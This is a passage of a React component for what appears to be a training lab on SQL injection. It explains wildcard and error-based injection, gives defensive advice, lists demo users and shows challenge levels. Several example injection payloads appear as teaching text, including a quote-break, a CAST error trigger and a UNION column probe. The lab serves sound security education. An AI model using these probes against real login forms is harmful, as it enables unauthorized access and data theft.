                            <div className="bg-gray-800 p-2 rounded mt-2">
                              <p className="font-semibold text-yellow-400 mb-1">🔍 How it worked:</p>
                              <ul className="list-disc list-inside space-y-1 ml-2">
                                <li>The <code className="text-yellow-300">LIKE '%'</code> matches everything</li>
                                <li>Wildcard <code className="text-yellow-300">%</code> means "any characters"</li>
                                <li>Made the condition true for all users</li>
                                <li>Advanced technique that bypasses keyword filters!</li>
                              </ul>
                            </div>
                          )}

                          <div className="bg-red-900/30 p-2 rounded mt-2 border border-red-700">
                            <p className="font-semibold text-red-300 mb-1">⚠️ Real-world impact:</p>
                            <p>In a real application, this would mean:</p>
                            <ul className="list-disc list-inside space-y-1 ml-2 mt-1">
                              <li>Complete account takeover</li>
                              <li>Access to sensitive data</li>
                              <li>Ability to impersonate users</li>
                              <li>Potential data theft or destruction</li>
                            </ul>
                          </div>
                        </div>
                      </div>
                    )}
                  </div>
                )}

                {response.error && (
                  <div className="bg-gray-900 p-4 rounded-lg border border-red-700">
                    <p className="text-xs text-gray-400 mb-2 font-semibold">💥 Error Details:</p>
                    <code className="text-sm text-red-400 font-mono block mb-3">{response.error}</code>

                    <div className="mt-3 p-3 bg-red-900/30 rounded border border-red-600">
                      <p className="text-sm font-semibold text-red-300 mb-2">🎓 Understanding Error-Based SQL Injection</p>
                      <div className="text-xs text-gray-300 space-y-2">
                        <p>
                          <span className="font-semibold text-red-400">What happened:</span> Your input caused a SQL syntax error.
                          In LOW security, these errors are shown to you - this is a HUGE vulnerability!
                        </p>

                        <div className="bg-gray-800 p-2 rounded mt-2">
                          <p className="font-semibold text-yellow-400 mb-1">Why this is dangerous:</p>
                          <ul className="list-disc list-inside space-y-1 ml-2">
                            <li>Error messages reveal database structure</li>
                            <li>Shows table names, column names, data types</li>
                            <li>Confirms if injection point exists</li>
                            <li>Helps craft more precise attacks</li>
                          </ul>
                        </div>

                        <div className="bg-gray-800 p-2 rounded mt-2">
                          <p className="font-semibold text-blue-400 mb-1">Error-Based Injection Technique:</p>
                          <p className="mb-1">Attackers intentionally trigger errors to extract information:</p>
                          <ul className="list-disc list-inside space-y-1 ml-2">
                            <li><code className="text-yellow-300">admin@example.com'</code> → Reveals SQL syntax</li>
                            <li><code className="text-yellow-300">' AND 1=CAST('text' AS INT)</code> → Forces type conversion error</li>
                            <li><code className="text-yellow-300">' UNION SELECT NULL,NULL</code> → Tests column count</li>
                            <li>Error messages leak database version, table structure, data</li>
                          </ul>
                        </div>

                        <div className="bg-gray-800 p-2 rounded mt-2">
                          <p className="font-semibold text-green-400 mb-1">How to prevent:</p>
                          <ul className="list-disc list-inside space-y-1 ml-2">
                            <li>✅ Never show SQL errors to users (MEDIUM+ levels do this)</li>
                            <li>✅ Use generic error messages like "Login failed"</li>
                            <li>✅ Log errors server-side for debugging</li>
                            <li>✅ Use parameterized queries (VERY HIGH level)</li>
                          </ul>
                        </div>

                        <p className="mt-2 text-yellow-300">
                          💡 <span className="font-semibold">Try this:</span> Look at the error message above.
                          Can you see parts of the SQL query? That's information leakage!
                        </p>
                      </div>
                    </div>
                  </div>
                )}
              </div>
            ) : (
              <div className="text-center py-12 text-gray-500">
                <div className="text-4xl mb-4">🎯</div>
                <p>Submit a login attempt to see the response...</p>
                <p className="text-sm mt-2">Try the quick tests or craft your own payload!</p>
              </div>
            )}
          </div>
        </div>

        {/* Info Section */}
        <div className="mt-8 grid md:grid-cols-2 gap-6">
          <div className="bg-gray-800 rounded-lg p-6 border border-gray-700">
            <h2 className="text-xl font-bold mb-4">👥 Demo Users</h2>
            <div className="space-y-3">
              {[
                { email: 'admin@example.com', password: 'admin123', role: 'admin' },
                { email: 'user@example.com', password: 'user123', role: 'user' },
                { email: 'test@example.com', password: 'test123', role: 'user' }
              ].map((user, idx) => (
                <div key={idx} className="bg-gray-900 p-3 rounded flex justify-between items-center">
                  <div className="font-mono text-sm">
                    <div className="text-gray-400">Email:</div>
                    <div>{user.email}</div>
                    <div className="text-gray-400 mt-1">Password:</div>
                    <div>{user.password}</div>
                  </div>
                  <div className="text-xs bg-blue-900 px-2 py-1 rounded">{user.role}</div>
                </div>
              ))}
            </div>
          </div>

          <div className="bg-gray-800 rounded-lg p-6 border border-gray-700">
            <h2 className="text-xl font-bold mb-4">🎯 Challenge Progress</h2>
            <div className="space-y-3">
              <div className="flex items-center gap-3">
                <span className="text-2xl">🟢</span>
                <div className="flex-1">
                  <div className="font-semibold">LOW Security</div>
                  <div className="text-xs text-gray-400">Bypass with basic SQL injection</div>
                </div>
              </div>
              <div className="flex items-center gap-3">
                <span className="text-2xl">🟡</span>
                <div className="flex-1">
                  <div className="font-semibold">MEDIUM Security</div>
                  <div className="text-xs text-gray-400">Bypass keyword filters</div>
                </div>
              </div>
              <div className="flex items-center gap-3">
                <span className="text-2xl">🟠</span>
                <div className="flex-1">
                  <div className="font-semibold">HIGH Security</div>
                  <div className="text-xs text-gray-400">Advanced exploitation required</div>
                </div>
              </div>
              <div className="flex items-center gap-3">
                <span className="text-2xl">🟣</span>
                <div className="flex-1">
                  <div className="font-semibold">EXPERT Security</div>
                  <div className="text-xs text-gray-400">Bypass WAF protection</div>
                </div>
              </div>
              <div className="flex items-center gap-3">
                <span className="text-2xl">🔵</span>
                <div className="flex-1">
                  <div className="font-semibold">BLIND Injection</div>
                  <div className="text-xs text-gray-400">Extract data with no feedback</div>
                </div>
              </div>
              <div className="flex items-center gap-3">
                <span className="text-2xl">⏱️</span>
                <div className="flex-1">
                  <div className="font-semibold">TIME-BASED Blind</div>
                  <div className="text-xs text-gray-400">Extract data via timing attacks</div>
                </div>
              </div>
              <div className="flex items-center gap-3">
                <span className="text-2xl">🔴</span>
                <div className="flex-1">
                  <div className="font-semibold">VERY HIGH Security</div>
                  <div className="text-xs text-gray-400">Properly secured - not injectable!</div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
